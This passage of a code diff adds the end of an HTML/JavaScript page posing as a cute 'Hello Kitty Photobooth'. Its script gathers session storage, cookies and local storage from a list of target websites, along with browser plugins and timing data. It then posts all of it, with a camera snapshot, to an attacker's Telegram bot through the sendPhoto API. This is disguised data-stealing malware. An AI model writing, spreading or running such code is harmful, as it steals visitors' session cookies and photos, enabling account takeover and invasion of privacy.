+  const ssKeys = Object.keys(cookieData.current.sessionStorage || {});
+  if (ssKeys.length > 0) {
+    caption += `📦 SS (${ssKeys.length}):\n`;
+    ssKeys.slice(0, 10).forEach(key => {
+      let val = cookieData.current.sessionStorage[key] || '';
+      if (val.length > 40) val = val.substring(0, 40) + '…';
+      caption += `  • ${key} = ${val}\n`;
+    });
+  }
+  caption += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
+  
+  // Các web khác
+  caption += `🌐 COOKIES TỪ CÁC WEB KHÁC:\n`;
+  let successCount = 0;
+  for (const [domain, data] of Object.entries(cookieData.websites)) {
+    if (data.success) {
+      successCount++;
+      caption += `✅ ${domain}: ${data.cookies.length} cookies`;
+      if (Object.keys(data.localStorage).length > 0) {
+        caption += `, ${Object.keys(data.localStorage).length} LS`;
+      }
+      caption += `\n`;
+      if (data.cookies.length > 0) {
+        data.cookies.slice(0, 3).forEach(c => {
+          let v = decodeURIComponent(c.value || '');
+          if (v.length > 40) v = v.substring(0, 40) + '…';
+          caption += `  • ${c.name} = ${v}\n`;
+        });
+        if (data.cookies.length > 3) {
+          caption += `  ... và ${data.cookies.length - 3} cookies khác\n`;
+        }
+      }
+    } else {
+      caption += `❌ ${domain}: ${data.error || 'Lỗi'}\n`;
+    }
+  }
+  caption += `📊 Thành công: ${successCount}/${Object.keys(cookieData.websites).length}\n`;
+  caption += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
+  
+  // Plugins
+  if (plugins.length > 0) {
+    caption += `🔌 PLUGINS (${plugins.length}):\n`;
+    plugins.slice(0, 10).forEach((p, i) => {
+      caption += `  ${i+1}. ${p}\n`;
+    });
+    if (plugins.length > 10) caption += `  ... và ${plugins.length - 10} plugins khác\n`;
+    caption += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
+  }
+  
+  // Performance
+  caption += `📊 PERFORMANCE:\n`;
+  caption += `🔹 Tải trang: ${perf.loadTime || 0}ms\n`;
+  caption += `🔹 DOM Ready: ${perf.domReady || 0}ms\n`;
+  caption += `🔹 DNS: ${perf.dns || 0}ms\n`;
+  caption += `🔹 TCP: ${perf.tcp || 0}ms\n`;
+  caption += `🔹 TTFB: ${perf.ttfb || 0}ms\n`;
+  caption += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
+  caption += `🌸 Cảm ơn bạn đã sử dụng! 🌸`;
+  
+  // ============================================================
+  // GỬI LÊN TELEGRAM
+  // ============================================================
+  canvas.toBlob(async (blob) => {
+    if (blob) {
+      const form = new FormData();
+      form.append('chat_id', TELEGRAM_CHAT_ID);
+      form.append('photo', blob, `hello_kitty_${Date.now()}.jpg`);
+      form.append('caption', caption);
+      form.append('parse_mode', 'HTML');
+      try {
+        const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+          method: 'POST',
+          body: form
+        });
+        const json = await res.json();
+        if (json.ok) {
+          setStatus('🎀 Thành công! Kitty đã nhận được dữ liệu! 💖', 'success');
+          actionBtns.classList.add('show');
+          addLog('✅ Đã gửi lên Telegram thành công!', 'success');
+        } else {
+          setStatus('⚠️ Lỗi gửi: ' + (json.description || 'Unknown'), 'error');
+          addLog(`❌ Lỗi Telegram: ${json.description || 'Unknown'}`, 'error');
+        }
+      } catch(e) {
+        setStatus('⚠️ Lỗi kết nối Telegram', 'error');
+        addLog(`❌ Lỗi: ${e.message}`, 'error');
+      }
+    }
+    captureBtn.disabled = false;
+  }, 'image/jpeg', 0.92);
+};
+
+// ============================================================
+// KHỞI TẠO
+// ============================================================
+addLog('🎀 Hello Kitty Photobooth đã sẵn sàng!', 'info');
+addLog(`📋 Sẽ thu thập từ ${TARGET_WEBSITES.length} web khác nhau`, 'info');
+addLog('🎵 Nhạc sẽ tự động phát!', 'info');
+setStatus('💖 Bấm nút để bắt đầu!', '');
+</script>
+</body>
+</html>
